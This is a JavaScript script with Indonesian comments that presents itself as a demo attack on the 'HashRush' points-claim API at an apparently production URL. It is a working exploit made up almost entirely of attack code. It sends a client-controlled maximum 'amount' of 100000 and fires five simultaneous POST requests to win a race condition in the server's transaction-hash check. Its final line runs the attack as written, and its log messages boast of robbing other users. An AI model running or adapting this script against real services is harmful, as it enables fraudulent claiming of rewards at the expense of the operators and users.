// SCRIPT UNTUK DEMO SERANGAN: MANIPULASI AMOUNT & SPAM
// Jalankan dengan: node attack_spam.js (atau ts-node attack_spam.ts)

const API_URL = "http://hashrush.vercel.app/api/claim"; // Sesuaikan dengan URL lokal/production

async function runAttack(fid, walletAddress, dummyTxHash) {
    console.log(`\n💀 [ATTACK INITIATED] Memulai eksploitasi untuk FID: ${fid}...`);

    // VULNERABILITY 1: Manipulasi Amount di Klien
    // Attacker mengirim 'amount' maximum (100000) lewat payload!
    // Server sama sekali tidak check berapa points yg sebenarnya user miliki,
    // langsung percaya pada input dari user.
    const payload = {
        fid: fid,
        walletAddress: walletAddress,
        txHash: dummyTxHash,
        amount: 100000 // MAKSIMAL AMOUNT HASHRUSH
    };

    // VULNERABILITY 2: Race Condition (Spam secara bersamaan)
    // Server mengecek if (tx used) lalu fetch RPC (butuh waktu bbrp detik).
    // Jika attacker mengirim 5 request serentak, semua lolos pengecekan awal karena tx_hash blm masuk DB!
    console.log(`🚀 Mengirim 5 request SPAM secara paralel di detik yang sama...`);
    const promises = [];
    for (let i = 0; i < 5; i++) {
        promises.push(
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).then(res => res.json()).catch(err => ({ error: err.message }))
        );
    }

    const results = await Promise.all(promises);

    // Cek Hasil
    results.forEach((res, index) => {
        if (res.success) {
            console.log(`✅ [HIT ${index + 1}] TEMBUS & MERAMPOK DEGEN! +${res.claimed} HP. Total Balance = ${res.newBalance} HP (Tier Instan Diamond)`);
        } else {
            console.log(`❌ [HIT ${index + 1}] Gagal: ${res.error}`);
        }
    });

    console.log(`\n💡 Kesimpulan Serangan:`);
    console.log(`Jika berhasil tembus, maka dengan 1 Transaksi (0 ETH), Attacker mendapatkan 100.000 Points!`);
}

// INSTRUKSI TES:
// 1. Lakukan transaksi apapun (kirim 0 ETH) dari wallet kamu ke Smart Contract: 0xA9D32A2Dbc4edd616bb0f61A6ddDDfAa1ef18C63
// 2. Dapatkan txHash dari block explorer (Basescan)
// 3. Masukkan fid kamu, wallet address kamu, dan txHash tsb ke bawah ini:
const MY_FID = 239311; // Ganti dengan angka FID asli
const MY_WALLET = "0x9a66Ea93b00eEe722AeCF713cc875a4Bd17dD2A2"; // Ganti
const VALID_TX_HASH = "0x4b45f21667c531a5bdc6bb9abffb4a33fd85eea0de59e1dfeae96be23ad57ff7"; // Ganti

// Buka komen di bawah untuk mengetes saat server menyala!
runAttack(MY_FID, MY_WALLET, VALID_TX_HASH);
